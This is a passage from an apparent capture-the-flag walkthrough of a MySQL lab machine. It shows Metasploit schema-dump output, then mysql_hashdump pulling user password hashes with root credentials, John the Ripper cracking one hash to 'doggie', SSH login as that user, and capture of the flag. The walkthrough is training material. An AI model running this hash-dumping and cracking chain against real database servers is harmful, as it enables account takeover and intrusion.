+      ColumnType: longtext
+    - ColumnName: db
+      ColumnType: varchar(64)
+    - ColumnName: full_scan
+      ColumnType: varchar(1)
+    - ColumnName: exec_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: err_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: warn_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: lock_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sent
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sent_avg
+      ColumnType: decimal(21,0)
+    - ColumnName: rows_examined
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_examined_avg
+      ColumnType: decimal(21,0)
+    - ColumnName: rows_affected
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_affected_avg
+      ColumnType: decimal(21,0)
+    - ColumnName: tmp_tables
+      ColumnType: bigint(20) unsigned
+    - ColumnName: tmp_disk_tables
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sorted
+      ColumnType: bigint(20) unsigned
+    - ColumnName: sort_merge_passes
+      ColumnType: bigint(20) unsigned
+    - ColumnName: digest
+      ColumnType: varchar(32)
+    - ColumnName: first_seen
+      ColumnType: timestamp
+    - ColumnName: last_seen
+      ColumnType: timestamp
+  - TableName: x$statements_with_errors_or_warnings
+    Columns:
+    - ColumnName: query
+      ColumnType: longtext
+    - ColumnName: db
+      ColumnType: varchar(64)
+    - ColumnName: exec_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: errors
+      ColumnType: bigint(20) unsigned
+    - ColumnName: error_pct
+      ColumnType: decimal(27,4)
+    - ColumnName: warnings
+      ColumnType: bigint(20) unsigned
+    - ColumnName: warning_pct
+      ColumnType: decimal(27,4)
+    - ColumnName: first_seen
+      ColumnType: timestamp
+    - ColumnName: last_seen
+      ColumnType: timestamp
+    - ColumnName: digest
+      ColumnType: varchar(32)
+  - TableName: x$statements_with_full_table_scans
+    Columns:
+    - ColumnName: query
+      ColumnType: longtext
+    - ColumnName: db
+      ColumnType: varchar(64)
+    - ColumnName: exec_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: no_index_used_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: no_good_index_used_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: no_index_used_pct
+      ColumnType: decimal(24,0)
+    - ColumnName: rows_sent
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_examined
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sent_avg
+      ColumnType: decimal(21,0) unsigned
+    - ColumnName: rows_examined_avg
+      ColumnType: decimal(21,0) unsigned
+    - ColumnName: first_seen
+      ColumnType: timestamp
+    - ColumnName: last_seen
+      ColumnType: timestamp
+    - ColumnName: digest
+      ColumnType: varchar(32)
+  - TableName: x$statements_with_runtimes_in_95th_percentile
+    Columns:
+    - ColumnName: query
+      ColumnType: longtext
+    - ColumnName: db
+      ColumnType: varchar(64)
+    - ColumnName: full_scan
+      ColumnType: varchar(1)
+    - ColumnName: exec_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: err_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: warn_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sent
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sent_avg
+      ColumnType: decimal(21,0)
+    - ColumnName: rows_examined
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_examined_avg
+      ColumnType: decimal(21,0)
+    - ColumnName: first_seen
+      ColumnType: timestamp
+    - ColumnName: last_seen
+      ColumnType: timestamp
+    - ColumnName: digest
+      ColumnType: varchar(32)
+  - TableName: x$statements_with_sorting
+    Columns:
+    - ColumnName: query
+      ColumnType: longtext
+    - ColumnName: db
+      ColumnType: varchar(64)
+    - ColumnName: exec_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: sort_merge_passes
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_sort_merges
+      ColumnType: decimal(21,0)
+    - ColumnName: sorts_using_scans
+      ColumnType: bigint(20) unsigned
+    - ColumnName: sort_using_range
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sorted
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_rows_sorted
+      ColumnType: decimal(21,0)
+    - ColumnName: first_seen
+      ColumnType: timestamp
+    - ColumnName: last_seen
+      ColumnType: timestamp
+    - ColumnName: digest
+      ColumnType: varchar(32)
+  - TableName: x$statements_with_temp_tables
+    Columns:
+    - ColumnName: query
+      ColumnType: longtext
+    - ColumnName: db
+      ColumnType: varchar(64)
+    - ColumnName: exec_count
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: memory_tmp_tables
+      ColumnType: bigint(20) unsigned
+    - ColumnName: disk_tmp_tables
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_tmp_tables_per_query
+      ColumnType: decimal(21,0)
+    - ColumnName: tmp_tables_to_disk_pct
+      ColumnType: decimal(24,0)
+    - ColumnName: first_seen
+      ColumnType: timestamp
+    - ColumnName: last_seen
+      ColumnType: timestamp
+    - ColumnName: digest
+      ColumnType: varchar(32)
+  - TableName: x$user_summary
+    Columns:
+    - ColumnName: user
+      ColumnType: varchar(32)
+    - ColumnName: statements
+      ColumnType: decimal(64,0)
+    - ColumnName: statement_latency
+      ColumnType: decimal(64,0)
+    - ColumnName: statement_avg_latency
+      ColumnType: decimal(65,4)
+    - ColumnName: table_scans
+      ColumnType: decimal(65,0)
+    - ColumnName: file_ios
+      ColumnType: decimal(64,0)
+    - ColumnName: file_io_latency
+      ColumnType: decimal(64,0)
+    - ColumnName: current_connections
+      ColumnType: decimal(41,0)
+    - ColumnName: total_connections
+      ColumnType: decimal(41,0)
+    - ColumnName: unique_hosts
+      ColumnType: bigint(21)
+    - ColumnName: current_memory
+      ColumnType: decimal(63,0)
+    - ColumnName: total_memory_allocated
+      ColumnType: decimal(64,0)
+  - TableName: x$user_summary_by_file_io
+    Columns:
+    - ColumnName: user
+      ColumnType: varchar(32)
+    - ColumnName: ios
+      ColumnType: decimal(42,0)
+    - ColumnName: io_latency
+      ColumnType: decimal(42,0)
+  - TableName: x$user_summary_by_file_io_type
+    Columns:
+    - ColumnName: user
+      ColumnType: varchar(32)
+    - ColumnName: event_name
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+  - TableName: x$user_summary_by_stages
+    Columns:
+    - ColumnName: user
+      ColumnType: varchar(32)
+    - ColumnName: event_name
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: bigint(20) unsigned
+  - TableName: x$user_summary_by_statement_latency
+    Columns:
+    - ColumnName: user
+      ColumnType: varchar(32)
+    - ColumnName: total
+      ColumnType: decimal(42,0)
+    - ColumnName: total_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: max_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: lock_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: rows_sent
+      ColumnType: decimal(42,0)
+    - ColumnName: rows_examined
+      ColumnType: decimal(42,0)
+    - ColumnName: rows_affected
+      ColumnType: decimal(42,0)
+    - ColumnName: full_scans
+      ColumnType: decimal(43,0)
+  - TableName: x$user_summary_by_statement_type
+    Columns:
+    - ColumnName: user
+      ColumnType: varchar(32)
+    - ColumnName: statement
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: lock_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sent
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_examined
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_affected
+      ColumnType: bigint(20) unsigned
+    - ColumnName: full_scans
+      ColumnType: bigint(21) unsigned
+  - TableName: x$wait_classes_global_by_avg_latency
+    Columns:
+    - ColumnName: event_class
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: decimal(42,0)
+    - ColumnName: total_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: min_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: decimal(46,4)
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+  - TableName: x$wait_classes_global_by_latency
+    Columns:
+    - ColumnName: event_class
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: decimal(42,0)
+    - ColumnName: total_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: min_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: decimal(46,4)
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+  - TableName: x$waits_by_host_by_latency
+    Columns:
+    - ColumnName: host
+      ColumnType: varchar(60)
+    - ColumnName: event
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+  - TableName: x$waits_by_user_by_latency
+    Columns:
+    - ColumnName: user
+      ColumnType: varchar(32)
+    - ColumnName: event
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+  - TableName: x$waits_global_by_latency
+    Columns:
+    - ColumnName: events
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+
+[*] 10.10.248.199:3306 - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > search mysql_hasdump
+[-] No results from search
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > search mysql_hashdump
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  auxiliary/scanner/mysql/mysql_hashdump  .                normal  No     MYSQL Password Hashdump
+   1  auxiliary/analyze/crack_databases       .                normal  No     Password Cracker: Databases
+   2    \_ action: hashcat                    .                .       .      Use Hashcat
+   3    \_ action: john                       .                .       .      Use John the Ripper
+
+
+Interact with a module by name or index. For example info 3, use 3 or use auxiliary/analyze/crack_databases
+After interacting with a module you can manually set a ACTION with set ACTION 'john'
+
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > use 0
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > options
+
+Module options (auxiliary/scanner/mysql/mysql_hashdump):
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
+                                        using-metasploit.html
+   RPORT     3306             no        The target port (TCP)
+   THREADS   1                yes       The number of concurrent threads (max one per host)
+   USERNAME                   no        The username to authenticate as
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
+PASSWORD => password
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 10.10.248.199
+RHOSTS => 10.10.248.199
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
+USERNAME => root
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > run
+
+[+] 10.10.248.199:3306 - Saving HashString as Loot: root:
+[+] 10.10.248.199:3306 - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+[+] 10.10.248.199:3306 - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+[+] 10.10.248.199:3306 - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
+[+] 10.10.248.199:3306 - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+[+] 10.10.248.199:3306 - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18                 <-------------------------- (take)
+[*] 10.10.248.199:3306 - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > exit
+________________________________________________________________________
+
+┌──(doc730㉿kali)-[~]
+└─$ sudo -i                              
+[sudo] password for doc730: 
+┌──(root㉿kali)-[~]
+└─# echo "carl:*EA031893AA21444B170FC2162A56978B8CEECE18">hash.txt                                             <----------------------- (dec)
+john hash.txt
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+Proceeding with incremental:ASCII
+doggie           (carl)                                                                                     <---------------------(ssh password(doggie))
+1g 0:00:00:01 DONE 3/3 (2024-12-22 00:42) 0.6134g/s 1402Kp/s 1402Kc/s 1402KC/s doggie..doggia
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+__________________________________________________________________________
+
+                                                                                
+┌──(doc730㉿kali)-[~]
+└─$ ssh carl@10.10.248.199
+carl@10.10.248.199's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Dec 21 08:42:47 UTC 2024
+
+  System load:  0.0               Processes:           86
+  Usage of /:   41.7% of 9.78GB   Users logged in:     0
+  Memory usage: 65%               IP address for eth0: 10.10.248.199
+  Swap usage:   0%
+
+
+23 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Thu Apr 23 12:57:41 2020 from 192.168.1.110
+carl@polomysql:~$ ls
+MySQL.txt														flag inside
+carl@polomysql:~$ cat MySQL.txt 								                              |								
+THM{congratulations_you_got_the_mySQL_flag}								<---------------------|
+
